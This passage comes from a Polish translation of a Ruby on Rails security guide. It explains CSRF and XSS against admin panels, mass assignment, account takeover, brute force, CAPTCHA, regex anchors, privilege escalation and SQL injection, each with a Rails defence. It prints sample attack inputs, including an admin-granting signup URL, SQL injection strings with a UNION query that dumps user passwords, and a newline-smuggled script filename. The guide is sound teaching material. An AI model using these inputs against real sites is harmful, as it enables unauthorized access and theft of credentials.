W 2007 roku pojawił się pierwszy, wykonany na zamówienie http://www.symantec.com/enterprise/security_response/weblog/2007/08/a_monster_trojan.html[Trojan], który ukradł informacje z Intranetu, czyli "Potwór dla pracodawców” strony internetowej Monster.com – strony do rekrutacji online. Indywidualnie stworzone Trojany są bardzo rzadkie, jak dotąd, a ryzyko ich użycia przeciw aplikacjom jest dość niskie, ale jest taka możliwość i jest to też przykład jak bezpieczeństwo hosta klienta jest ważne. Jednak najwyższe zagrożenie dla Intranetu i panelów Administracyjnych pochodzi z XSS i CSRF.  

*XSS*  Jeśli aplikacja ponownie wyświetla dane wejściowe złośliwego użytkownika z ekstranetu, aplikacja będzie podatny na XSS. Nazwy użytkowników, komentarze, spam raporty, adresy kolejności – to tylko kilka przykładów, które można zaatakować przez XSS. 

Nawet jedno miejsce w interfejsie administratora lub Intranecie, w którym dane wejściowe nie zostały sprawdzone, sprawia, że cała aplikacja staje się wrażliwa na atak. Atakującemu umożliwia to kradzież uprzywilejowanych cookies administratora, wstawianie kodu IFRAME, żeby wykraść hasła administratora lub instalowanie złośliwego oprogramowania poprzez luki w zabezpieczeniach przeglądarki w celach przejęcia kontroli nad komputerem administratora. 

Zapoznaj się z sekcją o atakach i ochronie przed XSS. [,#fffcdb]#Zalecane jest korzystanie z wtyczki SafeErb# również w intranecie lub interfejsie administratora. 

*CSRF*  Cross-Site Reference Forgery (CSRF) jest bardzo groźną metodą ataku. Pozwala ona atakującemu zrobić dokładnie to samo, co administrator lub użytkownik intranetu. Wcześniej dowiedziałeś się jak działa CSRF, a teraz czas na kilka przykładów:
 
W świecie rzeczywistym przykładem jest http://www.symantec.com/enterprise/security_response/weblog/2008/01/driveby_pharming_in_the_ wild.html[rekonfiguracja routera przez CSRF]. Atakujący rozesłał złośliwe maile z CSRF do meksykańskich użytkowników. E-mail informował o e-kartce czekającej na użytkowników, ale zawierał również Tag obrazka, które poprzez żądanie http-GET miał rekonfigurować router użytkownika (który jest popularnym modelem w Meksyku). Żądanie zmieniało ustawienia DNS w ten sposób, że żądania wysyłane do Meksykańskiego banku były mapowane do witryny atakującego. Każdy, kto odwiedził witrynę banku za pośrednictwem tego routera trafiał do fałszywej strony atakującego, a jego listy uwierzytelniające zostały skradzione. 

Inny przykład zmieniał e-mail i hasło do Google Adsense przez http://www.0x000000.com/index.php?i=213&bin=11010101[CSRF]. Jeżeli ofiara była zalogowana do programu Google Adsense, interfejsu administracyjnego kampanii reklamowych Google, atakujący mógł zmienić jego listy uwierzytelniające.  

Innym popularnym atakiem jest spamowanie twojej strony, bloga lub forum, w celu rozprzestrzenienia złośliwego XSS. Oczywiście, osoba atakująca musi znać strukturę URL, ale większość tych wykorzystywanych przez Railsy jest dość prosta, lub łatwa do odgadnięcia, jeśli jest to jeden z open sourcowych interfejsów administracyjnych. Atakujący może zrobić nawet do 1000 szczęśliwych trafów zawierając złośliwe IMG-tagi które próbują każdej możliwej kombinacji.

Informacje o [,#fffcdb]#ochronie przeciwko CSRF w interfejsach administracyjnych i aplikacjach intranetowych, znajdują się w dziale o ochronie przeciw CSRF#. 
  
=== Dodatkowe środki ostrożności 

Przeciętny interfejs administracyjny działa tak: jest umieszczony w www.example.com/admin, może być dostępny tylko wtedy, gdy flaga administratora jest ustawiona w modelu użytkownika, ponownie wyświetla wejście użytkownika i pozwala adminowi usuwać/dodawać/edytować wszysto, na co ma ochotę. Oto kilka słów na ten temat:
 
- Bardzo ważne jest, [,#fffcdb]#żeby myśleć o najgorszym przypadku#: Co zrobić, jeśli ktoś naprawdę przejmie moje pliki cookie lub poświadczenia użytkownika. Można [,#fffcdb]#wprowadzić role# dla interfejsu administratora, aby ograniczyć możliwości atakującego. A może [,#fffcdb]#specjalne poświadczenie logowania# do interfejsu administratora, inne niż te używane do publicznej części aplikacji. Lub [,#fffcdb]#specjalne hasło do bardzo poważnych działań#?

- Czy admin naprawdę ma dostęp do interfejsu z każdego miejsca na świecie? Pomyśl o [,#fffcdb]#ograniczeniu logowania na kilka adresów IP#. Zbadaj request.remote_ip, aby dowiedzieć się o adresach IP użytkowników. Nie gwarantuje to stu procentowej ochrony, ale na pewno stanowi dużą przeszkodę. Pamiętaj, że ktoś może używać serwera Proxy.
 
- [,#Fffcdb]#Umieść specjalny interfejs administracyjny w sub-domenie# takiej jak admin.application.com i stwórz z niej odrębną aplikację, z własnym zarządzaniem uzytkownikami. To sprawia, że kradzież cookie admina ze zwykłej domenie www.application.com jest niemożliwa. Wynika to z konceptu „same origin Policy” w przeglądarce: skrypt (XSS) wstawiony na stronie www.application.com nie może odczytać cookie z admin.application.com i vice versa.
 
== Masowe przypisanie

-- _Bez zachowania środków ostrożności Model.new(params[:model]) pozwala atakującemu na ustawienie wartości każdej kolumnie w bazie danych._
  
Masowe przypisanie może stać się problemem, ponieważ umożliwia atakującemu ustawienie atrybutów każdego modelu poprzez manipulację hash przekazanego do metody nowego modelu():

[source, ruby]
----------------------------------------------------------------------------
def signup
  params[:user] #=> {:name => “ow3ned”, :admin => true}
  @user = User.new(params[:user])
end
----------------------------------------------------------------------------

Masowe przypisanie może zaoszczędzić ciężkiej pracy, ponieważ nie musisz ustawiać wszystkich wartości indywidualni. Wystarczy przekazać hash do metody new() lub przypisać atrybuty=(atrybuty) wartość hash, aby ustawić atrybuty modelu do wartości w hashu. Problemem jest, że jest to często używane w połączeniu z parametrami (params) hasha dostępnego w kontrolerze, który może być manipulowany przez atakującego. Może to zrobić poprzez zmianę adresu URL w taki sposób:
 
..........
http://www.example.com/user/signup?user[name]=ow3ned&user[admin]=1
..........
 
Pozwoli to ustalić następujące parametry w kontrolerze:
 
[source, ruby]
----------------------------------------------------------------------------
params[:user] #=> {:name => “ow3ned”, :admin => true}
----------------------------------------------------------------------------

Więc tworząc nowego użytkownika za pomocą masowego przypisania, w prosty sposób można stać się administratorem.
 
=== Sposoby ochrony

Aby tego uniknąć, Railsy oferują dwie klasowe metody w klasie ActiveRecord do kontroli dostępu do atrybutów. Metoda attr_protected stanowi listę atrybutów, które nie będą dostępne dla masowego przypisania. Na przykład:
 
[source, ruby]
----------------------------------------------------------------------------
attr_protected :admin
----------------------------------------------------------------------------
 
O wiele lepsze rozwiązanie, kierujące się zasadą białej listy to [,#fffcdb]#metoda attr_accessible#. Jest dokładne naprzeciwieństwo attr_protected, ponieważ [,#fffcdb]#dotyczy listy atrybutów, które będą dostępne#. Wszystkie inne atrybuty będą chronione. W ten sposób nigdy nie zapomnisz o ochronie atrybutów podczas ich dodawania nowych w trakcie rozwoju. Oto przykład:

[source, ruby]
----------------------------------------------------------------------------
attr_accessible :name
----------------------------------------------------------------------------

Jeśli chcesz ustawić atrybut chroniony, będziesz musiał przypisać go indywidualnie: 
 
[source, ruby]
----------------------------------------------------------------------------
params[:user] #=> {:name => "ow3ned", :admin => true}
@user = User.new(params[:user])
@user.admin #=> false # not mass-assigned
@user.admin = true
@user.admin #=> true
----------------------------------------------------------------------------
 
== Zarządzanie użytkownikami

-- _Prawie każda aplikacja internetowa ma do czynienia z uwierzytelnianiem i autoryzacją. Zamiast kroczenia własną drogą, wskazane jest stosowanie typowych wtyczek (pluginów). Ale ważne jest, aby je aktualizować. Kilka dodatkowych środków ostrożności sprawi, że twoja aplikacja będzie jeszcze bezpieczniejsza._ 

Istnieje kilka wtyczek obsługujących uwierzytelnianie i autoryzację, dostępnych w Railsach. Te lepsze zapisują tylko zaszyfrowane hasła, a nie te czysto tekstowe. Najbardziej popularną wtyczką jest [,#fffcdb]#restful_authentication#, która chroni również przed atakami typu session fixation. Jednak wcześniejsze wersje dopuszczały do logowanie bez nazwy użytkownika i hasła w niektórych okolicznościach.
 
Każdy nowy użytkownik otrzymuje kod aktywacyjny, aby aktywować swoje konto. Link do aktywacji wysyłany jest w mailu. Po aktywacji konta, kolumna activation_code w bazie danych będzie ustawiona na NULL. Jeśli ktoś wyśle żądanie o taki URL, będzie zalogowany jako pierwszy aktywowany użytkownika, jakiego można znaleźć w bazie danych (i są szanse, że będzie to administrator):
 
..........
http://localhost:3006/user/activate
http://localhost:3006/user/activate?id=
..........
 
Jest to możliwe, gdyż na niektórych serwerach parametr id, tak jak w params[:id], miałby wartość nil. Jednakże, oto wyszukiwarka z akcji aktywacji: 

[source, ruby]
----------------------------------------------------------------------------
User.find_by_activation_code(params[:id])
----------------------------------------------------------------------------

Jeśli parametr miałby wartość nil, wynikające zapytanie SQL będzie takie: 
 
..........
SELECT * FROM users WHERE (users.`activation_code` IS NULL) LIMIT 1
..........
 
I tak wyszukiwarka znalazła pierwszego użytkownika w bazie danych, zwróciła go i został zalogowany. Więcej możesz przeczytać na http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/[moim blogu]. [,#fffcdb]#Od czasu do czasu Powinieneś aktualizować swoje wtyczki#. Ponadto możesz przeglądnąć swoją aplikację, żeby znaleźć więcej takich wad.

=== Ataki typu brute-force na konta użytkowników
 
-- _Ataki typu brute-force na dane logowania użytkowników są robione metodą prób i błędów. Możesz odpierać je stosując bardziej ogólne komunikaty o błędach i ewentualnie wymagać wprowadzania CAPTCHA._

Lista nazw użytkowników dla aplikacji internetowej może być wykorzystana do ataku typu brute-force na odpowiadające hasła, ponieważ większość ludzi nie używa wyszukanych haseł. Większość haseł stanowi połączenie wyrazów ze słownika i ewentualnie numerów. Uzbrojony w listę nazw użytkowników i w słownik, automatyczny program może znaleźć odpowiednie hasło w ciągu kilku minut.

Z tego powodu, większość aplikacji internetowych wyświetli ogólny komunikat o błędzie "Błędna nazwa użytkownika lub hasło", jeśli jedna z nich nie jest poprawna. Jeśli komunikat brzmi: "Wpisana nazwa użytkownika nie została znaleziona", atakujący mógłby automatycznie sporządzić listę nazw użytkowników. 
 
Jednak tym, co najczęściej zaniedbują projektanci aplikacji internetowych, są strony z zapomnianymi hasłami . Strony te często przyznają, że wpisana nazwa użytkownika lub adres e-mail (nie) została znaleziona. To pozwala atakującemu na skompilowanie listy nazw użytkowników i atak typu brute-force na ich konta.
 
W celu złagodzenia takich ataków, [,#fffcdb]#wyświetlaj ogólne komunikat o błędzie, również na stronach z zapomnianymi hasłami#. Ponadto, możesz [,#fffcdb]#wymagać, aby wprowadzić CAPTCHA po kilku błędów logowania z pewnego adresu IP#. Należy jednak pamiętać, że nie jest to stu procentowa ochrona przed automatycznymi programami, ponieważ te programy mogą bardzo często zmieniać adres IP. Jednakże zwiększa do poziom ochrony przed atakiem.
 
=== Przejęcie konta użytkownika

-- _Wiele aplikacji internetowych ułatwiają przejęcie kont użytkowników. Dlaczego by nie zrobić na odwrót i tego nie utrudnić?_

==== Hasła
 
Pomyśl o sytuacji, gdy atakujący posiada skradzione cookie sesji użytkownika, a zatem może wspólnie z użytkownikiem używać aplikacji. Jeżeli zmiana hasła jest łatwa, atakujący będzie mógł przejąć konto w kilku kliknięciach. Lub jeżeli formularz zmiany hasła jest podatny na atak CSRF, atakujący będzie mógł zmienić hasło ofiary wabiąc ją do strony internetowej, gdzie jest spreparowany IMG-tag, który odpala CSRF. Można temu zaradzić i [,#fffcdb]#stworzyć formularz zmiany hasła odporny na CSRF#. I [,#fffcdb]#wymagać od użytkownika, aby wprowadzał stare hasło przy jego zmianie#.
 
==== Maile
 
Jednakże, atakujący może również przejąć konto zmieniając adres e-mail. Po jego zmianie, przejdzie na stronę z zapomnianym hasłem i (prawdopodobnie nowy) hasło zostanie wysłane na adres e-mail atakującej osoby. Żeby temu zaradzić, można[,#fffcdb]#wymagać od użytkownika, aby wprowadził hasło przy zmianie adresu e-mail#. 

==== Inne

W zależności od Twojej aplikacji internetowej, może być więcej sposobów na przejęcie konta użytkownika. W wielu przypadkach można to zrobić za pomocą XSS i CSRF. Na przykład, podatność na CSRF w http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/[Google Mail]. W dowodzie koncepcji (proof-of-concept) tego ataku, ofiara miała być zwabiona do witryny internetowej kontrolowanej przez atakującego. Na tej stronie jest spreparowany IMG-tag, którego skutkiem jest żądanie HTTP GET,  zmieniające ustawienia filtru w Google Mail. Jeżeli ofiara byłaby zalogowana na Google Mail, atakujący zmieniłby filtry i ustawił przekazywanie wszystkich wiadomości e-mail na jego adres e-mail. Jest to prawie tak szkodliwe, jak przejęcie całego konta. Można temu zaradzić [,#fffcdb]#przeglądając logikę aplikacji i eliminując wszystkie luki wrażliwe na XSS i CSRF#.
 
=== CAPTCHA
  
-- _CAPTCHA jest testem typu challenge-response w celu ustalenia, że odpowiedź nie jest generowana przez komputer. Jest często używany do ochrony formularzy komentarza przed automatycznymi spam-botami. CAPTCHA prosi użytkownika o wypisanie liter z zniekształconego obrazka. Pomysł negatywnego CAPTCHA nie jest po to by udowadniać, że użytkownik jest człowiekiem, lecz po to, by ujawniać, że robot jest robotem._

Ale nie tylko spam roboty (boty) są problemem. Boty automatycznie logogujące również są problematyczne. Popularnym CAPTCHA API jest http://recaptcha.net/[reCAPTCHA], który wyświetla dwa zniekształcone obrazy zawierające słowa ze starych książek. reCAPTCHA dodaje również ukośne linie, zamiast zniekształcania tła i wysokiego poziomu wyginania tekstu jak to było w przypadku wcześniejszych CAPTCHA, które zostały złamane. Jako dodatek, używanie reCAPTCHA pomaga w tworzeniu cyfrowych wersji starych książek. http://ambethia.com/recaptcha/[ReCAPTCHA] jest także Railsową wtyczką, o takiej samej nazwie jak API.

Otrzymasz dwa klucze od API, publiczny i prywatny, który trzeba umieścić w swoim środowisku Railsowym. Po tym możesz użyć metody recaptcha_tags w widoku i metody verify_recaptcha w kontrolerze. Verify_recaptcha zwróci false, jeżeli walidacja zawiedzie. 
Problem z CAPTCHA jest taki, że są irytujące. Ponadto, niektórzy niedowidzący użytkownicy uznali, że niektóre rodzaje zniekształcenia CAPTCHA są trudne do odczytania. Pomysł negatywnego CAPTCHA nie jest po to by udowadniać, że użytkownik jest człowiekiem, lecz po to, by ujawniać, że robot jest robotem.
 
Większość botów jest naprawdę głupia – przeszukują sieć i umieszczają spam w każdym znalezionym polu formularza. Negatywne CAPTCHA wykorzystują to i umieszczają pole "honeypot" w formularzu, które będzie ukryte przed człowiekiem przez CSS lub JavaScript.  

Oto kilka pomysłów, jak ukryć pola honeypot przez JavaScript i/lub CSS: 
  
- Umieszczenie pola poza widocznym obszarem strony 
- Stworzenie bardzo małych elementów lub w tym samym kolorze, co tło strony 
- Zostaw pola widoczne, ale poinformuj ludzi, żeby pozostawić je puste 

Najprostsze negatywne CAPTCHA to te, ukryte w polach honeypot. Po stronie serwera, sprawdzana jest wartość pola: Jeśli zawiera tekst, to musi być bot. Następnie można zignorować dodany post, lub zwrócić pozytywny wynik, ale nie zapisywać posta w bazie danych. W ten sposób bot będzie zadowolony i przejdzie dalej. Można to również zrobić z irytującymi użytkownikami. 

Bardziej wyrafinowane negatywne CAPTCHA możesz znaleźć na http://nedbatchelder.com/text/stopbots.html[blogu Batchelder Ned’a]: 
 
- Dołącz pole z aktualnym znacznikiem czasowym UTC i sprawdź go na serwerze. Jeżeli jest on zbyt daleko w przeszłości, lub w przyszłości, formularz jest nieprawidłowy. 
- Nazwy pól dobieraj losowo 
- Umieszczaj więcej niż jedno pole honeypot we wszelkich rodzajach, również w przycisku wysyłania. 

Zauważ, że to chroni Cię jedynie przed automatycznymi botami, specjalnie wykonane roboty nie mogą być w ten sposób zatrzymane. Więc CAPTCHA może okazać się nienajlepszym sposobem by chronić formularze logowania. 

=== Logowanie
 
-- _Postaraj się, żeby Railsy nie wpisywały haseł w rejestrze._

Domyślnie Railsy rejestrują wszystkie żądania do strony internetowej. Ale rejestry mogą stanowić ogromny problem związany z zabezpieczeniami, ponieważ mogą one zawierać dane logowania, numery kart kredytowych itp. Podczas projektowania konceptu bezpieczeństwa aplikacji internetowej, należy pomyśleć o tym, co się stanie, gdy atakujący będzie miał (pełny) dostęp do serwera WWW. Szyfrowanie klucze i hasła w bazie danych będą bezużyteczne, jeżeli rejestr wylistuje je jako zwykły tekst. Możesz [,#fffcdb]#filtrować niektóre parametry żądań z rejestru# dzięki metodzie w kontrolerze filter_parameter_logging. Parametry te będą oznaczone [filtrowane] w rejestrze.
 
[source, ruby]
----------------------------------------------------------------------------
filter_parameter_logging :password
----------------------------------------------------------------------------
 
=== Dobre hasła
 
-- _Czy ciężko Ci zapamiętać wszystkie hasła? Nie zapisuj ich, lecz korzystaj z pierwszych liter wyrazów w łatwym do zapamiętania zdaniu._

Bruce Schneier, technolog zabezpieczeń, http://www.schneier.com/blog/archives/2006/12/realworld_passw.html[przeanalizował] 34000 występujących w świecie rzeczywistym nazw użytkowników i haseł ze wspomnianej wcześniej próby wyłudzenia danych z MySpace. Okazuje się, że większość haseł jest dość łatwa do złamania. Oto 20 najpopularniejszych: 

password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1 and monkey.

Interesujący jest fakt, że tylko 4% tych haseł to słownikowe wyrazy i większość to hasła alfanumeryczne. Jednak słowniki crackerów haseł zawierają wiele dzisiejszych haseł i próbują wszystkich (alfanumerycznych) kombinacji. Jeśli atakujący zna nazwę użytkownika, który używa słabego hasła, w łatwy sposób można dokonać włamania. 

Dobrym hasłem jest długa mieszanka alfanumerycznych kombinacji różnego rodziaju. Ponieważ jest to dość trudne do zapamiętania, jest wskazane, aby zapisać tylko [,#fffcdb]#pierwsze litery zdania, która można łatwo zapamiętać#. Na przykład "Szybki brązowy lis przeskoczył nad leniwym psem" będzie "Sblpnlp". Zauważ, że jest to tylko przykład, nie należy używać znanego wyrażenia, które może pojawić się w słowniki crackera.
 
=== Wyrażenia regularne
 
-- _Powszechną pułapką w wyrażeniach regularnych w Ruby jest dopasowanie ciągu na początku i na końcu przez ^ i $, zamiast \A i \z._ 

Ruby używa nieco innego podejścia niż w wielu innych językach, aby dopasować koniec i początek ciągu znaków. Dlatego nawet w książkach o Ruby i Railsach popełnia się błędy. Więc w jaki sposób może to zagrażać bezpieczeństwu? Wyobraź sobie, że masz model pliku i walidujesz nazwę pliku przez wyrażenie regularne w taki sposób:
 
[source, ruby]
----------------------------------------------------------------------------
class File < ActiveRecord::Base
  validates_format_of :name, :with => /^[\w\.\-\+]+$/
end
----------------------------------------------------------------------------

Oznacza to, że model potwierdzi nazwę pliku składającą się tylko ze znaków alfanumerycznych, kropek, + i -. I programista dodaje \^ i $ tak, że nazwa pliku będzie zawierać te znaki od początku do końca łańcucha. Jednakże [#,fffcdb]#w Ruby ^ i $ odpowiada *line* początkowi i końcu linii#. A więc taka nazwa pliku przechodzi przez filtr bez problemów: 

..........
file.txt%0A<script>alert('hello')</script>
..........
 
Jak %0A jest feedem linii w kodowaniu URL, tak w Railsach automatycznie konwertuje je do "file.txt\n<script>alert(‘Hello’)</script>". Ta nazwa pliku przechodzi przez filtr, gdyż wyrażenie regularne pasuje - do końca linii, reszta nie ma znaczenia. Prawidłowe wyprażenie powinno brzmieć:
 
[source, ruby]
----------------------------------------------------------------------------
/\A[\w\.\-\+]+\z/
[source, ruby]
----------------------------------------------------------------------------

=== Eskalacja przywilejów
  
-- _Zmiana pojedynczego parametru może dać użytkownikowi nieautoryzowany dostęp. Pamiętaj, że każdy parametr może ulec zmianie, bez względu na to jak bardzo go ukrywasz zacierasz._ 

Najpopularniejszym parametrem, który użytkownik może modyfikować, jest parametr id, jak w http://www.domain.com/project/1+, gdziet 1 jest identyfikatorem. Jest on dostępny w params[:id] w kontrolerze. Najprawdopodobniej będziesz mógł teraz zrobić coś takiego: 
 
[source, ruby]
----------------------------------------------------------------------------
@project = Project.find(params[:id])
----------------------------------------------------------------------------

Jest to w porządku dla niektórych aplikacji internetowych, ale z pewnością nie w przypadku, gdy użytkownik nie ma uprawnień, aby zobaczyć wszystkie projekty. Jeśli użytkownik zmienia id na 42 i nie jest uprawniony do przeglądania informacji, to i tak będzie miał do nich dostęp. Zamiast tego[,#fffcdb]#pytaj również o prawa dostępu użytkownika#: 

[source, ruby]
----------------------------------------------------------------------------
@project = @current_user.projects.find(params[:id])
----------------------------------------------------------------------------

W zależności od twojej aplikacji internetowej, może być o wiele więcej parametrów, które użytkownik może modyfikować. Przyjmij zasadę, że [,#fffcdb]#żadne dane wejściowe użytkownika nie są bezpieczne, dopóki nie zostanie udowodnione, że jest inaczej. Użytkownik może manipulować każdym parametrem#. 
 
Nie daj się nabrać na ściemnione bezpieczeństwo i bezpieczeństwo JavaScript. Toolbar progamisty dla przeglądarki Mozilla Firefox pozwala przejrzeć i zmienić każde ukryte pole formularza. [,#fffcdb]#JavaScript może być wykorzystywany w celu weryfikacji danych użytkownika, ale z pewnością nie po to, by zapobiec wysyłaniu złośliwych żądań z nieoczekiwanymi wartościami#. Wtyczka Live Http Headers do przeglądarki Mozilla Firefox rejestruje każde żądanie, może go powtarzać i zmieniać. Jest to prosty sposób na ominięcie wszelkich walidacji przez JavaScript. Są też nawet proxy po stronie klienta, które pozwalają na przechwytywanie wszelkich żądań i odpowiedzi z i do Internetu. 
 
== Atak typu Injection
  
- _Klasa ataków typu ijection polega na wprowadzeniu złośliwego kodu lub parametrów do aplikacji internetowej w celu uruchomienia jej w kontekście jej bezpieczeństwa. Czołowy przykład ataku typu injection jest atak cross-site scripting (XSS) I atak typu SQL injection._ 

Atak typu injection jest bardzo podstępny, ponieważ ten sam kod lub parametr może być złośliwy w jednym kontekście, ale całkowicie nieszkodliwy w innym. Kontekstem może być kodowanie, zapytania lub język programowania, powłoka (Shell) lub metoda w Ruby/Rails. Poniższe sekcje będą obejmować wszystkie ważne konteksty gdzie mogą wystąpić ataki typu injection. Pierwsza część obejmuje architektoniczne decyzje w związku z atakiem typu injection. 
 
=== Białe listy vs Czarne listy
  
-- _Przy poprawianiu, ochronie lub sprawdzeniu czegoś, białe wygrywają z czarnymi listami._

Czarna lista może być zbiorem złych adresów e-mail, niepublicznych działań lub złych tagów HTML. Jest przeciwieństwem do białej listy, która zawiera dobre adresy e-mail, publiczne działania, dobre znaczniki HTML i tak dalej. Chociaż czasami nie jest możliwe stworzenie białej (na przykład filtr antyspamowy), [,#fffcdb]#lepiej używać białej list#: 
 
- Korzystaj z: before_filter:only => [...] zamiast: expect => [...]. W ten sposób nie zapomnisz go wyłączyć dla świeżo dodanych akcji. 
- Korzystaj z: attr_accessible zamiast: attr_protected. Szczegóły znajdziesz w sekcji o masowym przypisaniu. 
- Zezwól na <strong> zamiast usuwania <script> przeciwko Cross-Site Scripting (XSS). Zobacz poniżej. 
- Nie próbuj poprawiać wejścia użytkownika przez czarne listy: 
   * W ten sposób atak będzie działał tak: "<sc<script>ript>".gsub("<script>", "")
   * Ale odrzucaj nieprawidłowe wejście 
 
Białe są również dobre w przypadku gdy ludzie zapominają pewnych rzeczy umieścić na czarnych listach. 

=== Atak typu SQL Injection
  
-- _Dzięki zmyślnym metodom, ten problem zniknął już z większości aplikacji Railsowych. Jest to jednak bardzo niszczycielski i powszechny atak na aplikacje internetowe, więc ważne jest, aby zrozumieć problem._ 

==== Wstęp
  
Atak typu SQL injection ma na celu wpływanie na zapytania do bazy danych poprzez manipulowanie parametrami aplikacji internetowej. Popularnym celem ataków typu SQL injection jest ominięcie autoryzacji. Kolejnym celem jest manipulacja danymi lub odczyt dowolnych danych. Oto przykład, jak nie używać danych wejściowych użytkownika w zapytaniu: 

[source, ruby]
----------------------------------------------------------------------------
Project.find(:all, :conditions => "name = '#{params[:name]}'")
----------------------------------------------------------------------------

Może to być w akcji wyszukiwania i użytkownik może wpisać nazwę projektu, który chce znaleźć. Jeśli złośliwy użytkownik wpisze ' OR 1=1', wynikiem zapytania SQL będzie:
 
..........
SELECT * FROM projects WHERE name = '' OR 1 --'
..........
 
Dwie kreski rozpoczynają komentarz ignorując wszystko po nim. Zatem zapytanie zwraca wszystkie rekordy z tabeli projekty, w tym te niewidoczne dla użytkownika. Dzieje się tak, ponieważ warunek jest prawdziwy dla wszystkich rekordów.
 
==== Pominięcie autoryzacji
 
Zwykle aplikacja internetowa zawiera kontrolę dostępu. Użytkownik wprowadza jego dane logowania, a aplikacja próbuje znaleźć pasujący rekord w tabeli użytkowników. Aplikacja zapewnia dostęp, jeżeli znajdzie rekord. Jednakże, osoba atakująca może ewentualnie pominąć ten krok poprzez atak SQL injection. Poniżej pokazane jest typowe zapytanie do bazy danych w Railsach w celu znalezienia pierwszego rekordu w tabeli użytkowników, który pasuje do parametrów logowania dostarczonych przez użytkownika. 

[source, ruby]
----------------------------------------------------------------------------
User.find(:first, "login = '#{params[:name]}' AND password = '#{params[:password]}'")
----------------------------------------------------------------------------
 
Jeżeli atakujący wprowadzi ' OR '1'='1 jako imię i ' OR '2'>'1 jako hasło, rezultat zapytania SQL będzie następujący:
 
.........
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
.........
 
To po prostu znajdzie pierwszego użytkownika w bazie danych i zapewni mu dostęp do aplikacji.
 
==== Nieautoryzowane czytanie
 
UNIA łączy dwa zapytania SQL i zwraca dane w jednym zestawie. Atakujący może jej użyć do odczytu arbitralnych danych z bazy danych. Weźmy przykład z góry: 
 
[source, ruby]
----------------------------------------------------------------------------
Project.find(:all, :conditions => "name = '#{params[:name]}'")
----------------------------------------------------------------------------

A teraz wprowadźmy inne zapytanie używając UNII: 
 
............
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
............
 
W rezultacie otrzymamy następujące zapytanie SQL:
 
............
SELECT * FROM projects WHERE (name = '') UNION 
  SELECT id,login AS name,password AS description,1,1,1 FROM users --')
............

Rezultatem nie będzie lista projektów (ponieważ nie ma projektu z pustym polem nazwy), tylko lista nazw użytkowników i ich hasła. Więc miejmy nadzieję, że zaszyfrowałeś hasła w bazie danych! Jedynym problemem dla atakującego jest to, że liczba kolumn musi być taka sama w obu zapytaniach. Dlatego drugie zapytanie zawiera listę jedynek (1), która zawsze będzie mieć wartość 1, w celu dopasowania liczby kolumn w pierwszym zapytaniu. 
 
Również drugie zapytanie zmienia nazwy niektórych kolumn korzystając z AS tak aby aplikacja internetowa wyświetlała wartości z tabeli użytkowników. Pamiętaj, aby zaktualizować Railsy http://www.rorsecurity.info/2008/09/08/sql-injection-issue-in-limit-and-offset-parameter/[przynajmniej do wersji 2.1.1]. 

 
==== Sposoby ochrony
 
Ruby on Rails jest wyposażone w specjalny filtr dla znaków SQL, do których należą znaki ucieczki ' , " , znak NULL i podziały wiersza. [,#Fffcdb]#Korzystając z Model.find(id) lub Model.find_by_something(coś) automatycznie stosujesz ochronę#. Ale fragmenty SQL, szczególnie [,#fffcdb]#fragmenty w conditions (:conditions => "..."), metody connection.execute() lub Model.find_by_sql() muszą być stosowane ręcznie#. 

Zamiast przekazywania ciągu do opcji conditions, możesz przekazać tablicę do oczyszczenia zanieczyszczonego ciągu znaków w taki sposób: 

[source, ruby]
----------------------------------------------------------------------------
Model.find(:first, :conditions => ["login = ? AND password = ?", entered_user_name, entered_password])
----------------------------------------------------------------------------

Jak widać, pierwsza część tablicy jest fragmentem SQL ze znakami zapytania. W oczyszczonej wersji zmienne w drugiej części tablicy zastąpiły znaki zapytania. To samo można zrobić z hashem: 
 
[source, ruby]
----------------------------------------------------------------------------
Model.find(:first, :conditions => {:login => entered_user_name, :password => entered_password})
----------------------------------------------------------------------------
 
Tablica lub formularz hasha jest dostępny tylko w instancjach modelu. Możesz spróbować +sanitize_sql()+ gdzie indziej. [,#fffcdb]#Nabierz nawyku myślenia o konsekwencjach dla bezpieczeństwa gdy korzystasz z zewnętrznego ciągu znaków w SQL#. 

=== Atak Cross-Site Scripting (XSS)

- _Najbardziej rozpowszechnionym i zarazem jednym z najbardziej niszczycielski dla aplikacji internetowych jest atak typu XSS. Ten złośliwy atak wprowadza wykonywalny kod po stronie klienta. Railsy dostarczają helpery, żeby się przed nim bronić._ 

 
==== Punkty wejścia

Punkt wejścia jest to podatny URL i jego parametry, gdzie atakujący może rozpocząć atak.

Najczęstszymi punktami wejścia są posty, komentarze użytkowników i księgi gości, ale tytuły projektów, nazwy dokumentów i strony z wynikami wyszukiwania również są narażone - niemal wszystkie miejsca, w których użytkownik może wprowadzać dane. Ale wejście nie musi pochodzić z pól wejścia na stronach internetowych. Może być to jakikolwiek parametr URL - nawet, ukryty lub wewnętrzny. Pamiętaj, że użytkownik może przechwycić jakikolwiek ruch. Aplikacje, takie jak http://livehttpheaders.mozdev.org/[wtyczka Live HTTP Headers Firefox] lub Proxy po stronie klienta ułatwiają zmianę żądania. 

Ataki XSS działają w taki sposób: Atakujący wprowadza jakiś kod, aplikacja internetowa zapisuje go i wyświetla na stronie, a później przedstawia ofiarze. Większość przykładów XSS prostu wyświetla okno ostrzegawcze (alert box), ale jest to dużo bardziej groźne. XSS może wykraść cookies, przechwytywać sesje; przekierowywać ofiary do fałszywej strony internetowej, wyświetlać reklamy na korzyść atakującego, zmieniać elementy na stronie internetowej, aby uzyskać poufne informacje lub instalować złośliwe oprogramowanie poprzez luki w przeglądarce internetowej. 

